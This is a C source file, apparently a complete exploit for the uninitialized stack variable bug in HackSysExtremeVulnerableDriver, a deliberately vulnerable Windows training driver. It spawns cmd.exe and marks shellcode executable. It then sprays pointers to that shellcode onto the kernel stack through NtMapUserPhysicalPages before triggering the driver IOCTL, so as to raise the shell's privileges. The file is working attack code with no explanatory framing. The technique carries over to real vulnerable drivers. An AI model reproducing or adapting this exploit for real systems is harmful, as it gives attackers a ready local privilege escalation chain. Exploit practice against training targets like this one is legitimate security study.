#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_hevd = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	HMODULE h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	NtMapUserPhysicalPages _NtMapUserPhysicalPages = 0;
	unsigned long old_protection = 0L, pid = 0L, bytes_returned = 0L;
	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_information;
	int zero = 0, counter = 0;
	LPVOID spray_address = &shellcode;
	char output[1024];
	unsigned long long pfns[4096];

	RtlSecureZeroMemory(&pfns, sizeof(pfns));
	RtlSecureZeroMemory(&output, sizeof(output));
	RtlSecureZeroMemory(&startup_info, sizeof(startup_info));
	RtlSecureZeroMemory(&process_information, sizeof(process_information));
	_INPUT_DATA.magic = 0xAABBCCDD;

	printf("[!] HackSysExtremeVulnerableDriver Uninitialized Stack Variable Exploit\n[!] Let's exploit!");

	if (h_hevd == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a driver handle. Handle Value: 0x%p, Error: %d (0x%x)", h_hevd, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle. Handle Value: 0x%p", h_hevd);

	if (!h_ntdll)
	{
		printf("\n[-] Failed to load ntdll.dll. Handle Value: 0x%p, Error: %d (0x%x)", h_ntdll, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Loaded ntdll.dll. Handle Value: 0x%p", h_ntdll);

	_NtMapUserPhysicalPages = (NtMapUserPhysicalPages)GetProcAddress(h_ntdll, "NtMapUserPhysicalPages");
	if (!_NtMapUserPhysicalPages)
	{
		printf("\n[-] Failed to locate NtMapUserPhysicalPages function address. Address: 0x%p, Error: %d (0x%x)", _NtMapUserPhysicalPages, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located NtMapUserPhysicalPages function address. Address: 0x%p", _NtMapUserPhysicalPages);

	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", 0, 0, 0, 1, CREATE_NEW_CONSOLE, 0, 0, &startup_info, &process_information))
	{
		printf("\n[-] Failed to spawn a shell. Error: %d (0x%x)", GetLastError(), GetLastError());
		CloseHandle(process_information.hProcess);
		CloseHandle(process_information.hThread);
		unused = getchar();
		return 1;
	}
	printf("\n[+] Spawned a shell.");

	pid = process_information.dwProcessId;
	*(unsigned long*)(shellcode + 27) = pid;
	printf("\n[+] Set shellcode target process ID to %d (0x%x).", pid, pid);

	if (!VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to change shellcode memory protection. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Changed shellcode memory protection.");

	for (unsigned long long i = 0L; i < 512L; i++)
	{
		memcpy(pfns + (i * 8L), spray_address, 8);

		counter++;
		printf("\n[*] Built PFN %d. Value: 0x%p", counter, (unsigned long long*)(pfns + i));
	}
	printf("\n[+] Built Page Frame Number list.\n[!] Time to race the kernel stack...");

	_NtMapUserPhysicalPages(&zero, 512, &pfns);
	DeviceIoControl(h_hevd, TARGET_IOCTL, &_INPUT_DATA, sizeof(_INPUT_DATA), &output, sizeof(output), &bytes_returned, 0);

	return 0;
}